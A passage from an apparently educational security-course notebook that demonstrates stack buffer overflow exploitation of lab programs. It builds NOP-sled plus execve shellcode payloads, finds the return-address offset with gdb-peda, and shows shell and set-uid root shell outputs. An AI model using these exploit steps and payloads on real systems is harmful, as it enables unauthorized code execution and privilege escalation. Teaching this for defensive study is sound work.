# let's create NOP sled of 100 bytes long and write it to payload.bin file
! python -c 'import sys; sys.stdout.buffer.write(b"\x90"*100)' > payload.bin
```


```python
# let's append shellcode_py3.bin to payload.bin file
! cat shellcode_py3.bin >> payload.bin
```


```python
! wc -c payload.bin
```

    124 payload.bin



```python
! hexdump -C payload.bin
```

    00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000060  90 90 90 90 31 c0 50 68  2f 2f 73 68 68 2f 62 69  |....1.Ph//shh/bi|
    00000070  6e 89 e3 31 c9 89 ca 6a  0b 58 cd 80              |n..1...j.X..|
    0000007c


- what's the address of buffer?
- make sure we use the same size of junk as the size of the payload
- this should be run directly from terminal as the buffer will shift if the program is run from the notebook

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./so_arg.exe $(python3 -c 'print("A"*144, end="")')
buffer is at 0xffffb8d0 <<<<----NOTE THIS ADDRESS --!!!!
buffer contains: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./so_arg.exe $(python3 -c 'print("A"*144, end="")')

```

- you can try landing at the base address of buffer or some bytes away from it, just in case!


```python
# it's recommended to pick SOME bytes away from the base address of the buffer 
# if possible and necessary
! printf "%x" $((0xffffB8D0+20))
```

    ffffb8e4


```python
# but, let's just use the buffer's base address to start with...
# we repeat the return address 5 times
! python -c 'import sys; sys.stdout.buffer.write(b"\xe4\xb8\xff\xff"*5)' >> payload.bin
```


```python
# out payload is ready; let's check size make sure it's the same as the offset
! wc -c payload.bin
```

    144 payload.bin



```python
# let's see the content using hexdump
! hexdump -C payload.bin
```

    00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000060  90 90 90 90 31 c0 50 68  2f 2f 73 68 68 2f 62 69  |....1.Ph//shh/bi|
    00000070  6e 89 e3 31 c9 89 ca 6a  0b 58 cd 80 e4 b8 ff ff  |n..1...j.X......|
    00000080  e4 b8 ff ff e4 b8 ff ff  e4 b8 ff ff e4 b8 ff ff  |................|
    00000090


#### finally, run the target program with the payload 

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./so_arg.exe $(cat payload.bin)
buffer is at 0xffffb8d0
buffer contains: 
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j
              X��������������������
kali@x86_64-conda-linux-gnu:~/projects/SoftwareSecurity/demos/stack_overflow$ whoami        
kali
                                                                                                        
(base) kali@x86_64-conda-linux-gnu:~/projects/SoftwareSecurity/demos/stack_overflow$ exit

```

### What about root shell?
- create softlink `/bin/sh` pointing to `/bin/zsh`
- make the program set-uid root and exploit it using the same payload


```python
! echo kali | sudo -S ln -sf /bin/zsh /bin/sh
```

    [sudo] password for kali: 


```python
! ls -al /bin/sh
```

    lrwxrwxrwx 1 root root 8 Apr  2 15:48 /bin/sh -> /bin/zsh



```python
! echo kali | sudo -S chown root:root so_arg.exe
```

    [sudo] password for kali: 


```python
! echo kali | sudo -S chmod u+s so_arg.exe
```

    [sudo] password for kali: 


```python
! ls -al so_arg.exe
```

    -rwsr-xr-x 1 root root 31484 Apr  2 15:24 so_arg.exe


#### Exploit the program
- launch the same payload created before as nothing else has changed

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./so_arg.exe $(cat payload.bin)
buffer is at 0xffffb8d0
buffer contains: 
����������������������������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j
              X��������������������
kali# whoami                                                                                            
root
kali# date                                                                                              
Mon Mar 31 17:31:00 EDT 2025
kali# exit  
```

## Use standard input to smuggle the shellcode

- if the program takes data from standard input and the buffer overrun is possible, then shellcode can still be transmitted and the program exploited
- the steps are slightly different from sending shellcode as an argument
- let's work with `so_stdio.cpp` program to demonstrate the steps


```python
! cat so_stdio.cpp
```


```bash
%%bash
input=so_stdio.cpp
output=so_stdio.exe

echo kali | sudo -S ../compile.sh $input $output
```

- since the stack_overflow_stdio.exe program reads the data from standard input, it can be piped to the program


```python
! python -c 'print("Hello World")' | ./so_stdio.exe
```

### Crash the program

- quick way to tell if the program has buffer overrun vulnerability, is to send a long string and see how the program reacts
- if the program segfaults, it's a telltail sign that the program has buffer overflow flaw


```python
! python -c 'print("A"*100)' | ./so_stdio.exe
```

- because the size of the buffer is 128 and the data we sent was 100, this was okay as expected


```python
# try longer string
! python -c 'print("A"*200)' | ./so_stdio.exe
# since Good bye! is not printed; program must have crashed!
```

#### Manually using gdb-peda

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity]
└─$ gdb -q ./so_stdio.exe 
Reading symbols from ./so_stdio.exe...

```

- since the program reads the data from standard input, we need to pipe the cyclic pattern from a file

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity]
└─$ gdb -q ./so_stdio.exe 
Reading symbols from ./so_stdio.exe...
gdb-peda$ pattern create 200 pattern.txt
Writing pattern of 200 chars to filename "pattern.txt"

gdb-peda$ run < pattern.txt 
Starting program: /home/kali/projects/SoftwareSecurity/so_stdio.exe < pattern.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
buffer is at 0xffffbd90
Give me some text: Acknowledged: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA with length 200

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0xf7e23c40 --> 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:     endbr32)
EBX: 0x41416b41 ('AkAA')
ECX: 0xf7a1e9b8 --> 0x0 
EDX: 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:    endbr32)
ESI: 0x6c414150 ('PAAl')
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffbe20 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffbe20 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffbe24 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffbe28 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffbe2c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffbe30 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffbe34 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffbe38 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffbe3c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()


```
- now let's search for pattern to find the offset

```bash
gdb-peda$ patts

gdb-peda$ patts
Registers contain pattern buffer:
EBX+0 found at offset: 128
EBP+0 found at offset: 136
ESI+0 found at offset: 132
EIP+0 found at offset: 140
Registers point to pattern buffer:
[ESP] --> offset 144 - size ~56
Pattern buffer found at:
0x08051bbe : offset    0 - size  200 ([heap])
0x08051fc0 : offset    0 - size  200 ([heap])
0xf7fa70b9 : offset 33208 - size    4 (/usr/lib32/libm.so.6)
0xffffbd90 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])
References to pattern buffer found at:
0xf7a1d624 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d628 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d62c : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d630 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d634 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d638 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d63c : 0x08051fc0 (/usr/lib32/libc.so.6)
0xffffb8c8 : 0xffffbd90 ($sp + -0x558 [-342 dwords])


```

- so, the buffer length is **144 bytes** to completely overwrite the caller's return address
- next, we need to find the base address of buffer whose location doesn't change with the size of stadard input data provided to the program 
- the base address of buffer is conveniently printed

#### Using GDB-batch commands


```python
pattern create 200 pattern.txt! cat gdb-so-stdio.txt
```


```python
! gdb -q -batch -x gdb-so-stdio.txt ./so_stdio.exe
```

- create the payload in the form
```
| NOP sled | shellcode | repeated return address |
```
- we need to do some math to figure out the length of NOP sled and repeated return address we need to make the total payload length to be **144 bytes**
- user shellcode size is fixed, let's copy and see the size


```python
! cp ../shellcodes/shellcode.bin .
```


```python
! wc -c shellcode.bin
```


```python
# this leaves us with
print(144-24)
```

- since we've 120 bytes, let's use 10 repeated return address just in case
- with the repeated return address length = `10 * 4 = 40`


```python
# NOP sled length
print(120-40)
```

- so we can use 80 NOP bytes as sled to slide down to our shellcode
- now we have all the numbers we need to create our 144 long payload with shellcode


```python
! python -c 'import sys; sys.stdout.buffer.write(b"\x90"*80)' > stdio_payload.bin
```


```python
! wc -c stdio_payload.bin
```


```python
! cat shellcode.bin >> stdio_payload.bin
```


```python
! wc -c stdio_payload.bin
```

- we need to get the buffer's address from the terminal, not from the Jupyter Notebook!

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ python -c 'print("A"*10)' | ./so_stdio.exe 
buffer is at 0xffffb970
Give me some text: Acknowledged: AAAAAAAAAA with length 10
Good bye!

```


```python
! python -c 'import sys; sys.stdout.buffer.write(b"\x70\xb9\xff\xff"*10)' >> stdio_payload.bin
```


```python
! wc -c stdio_payload.bin
```

- payload is ready and let's send it to the target program from the terminal
- note the **- (hyphen)** after cat command is required to make the shell interactive
- we don't get a prompt but an accessible terminal; just write some commands such as `whoami`, `ls`, etc.

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ python -c 'print("A"*10)' | ./so_stdio.exe 
buffer is at 0xffffbe00
Give me some text: Acknowledged: AAAAAAAAAA with length 10
Good bye!
                                                                                                
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ cat stdio_payload.bin - | ./so_stdio.exe
buffer is at 0xffffb970
Give me some text: hello
Acknowledged: ��������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j
        Xp���p���p���p���p���p���p���p���p���p���hello with length 149
whoami
kali
date
Mon Mar 31 17:35:58 EDT 2025
exit

```

## Use pwntools library to automate everything

- see examples under pwntools tutorial chapter
- rest left as an exercise


```python

```
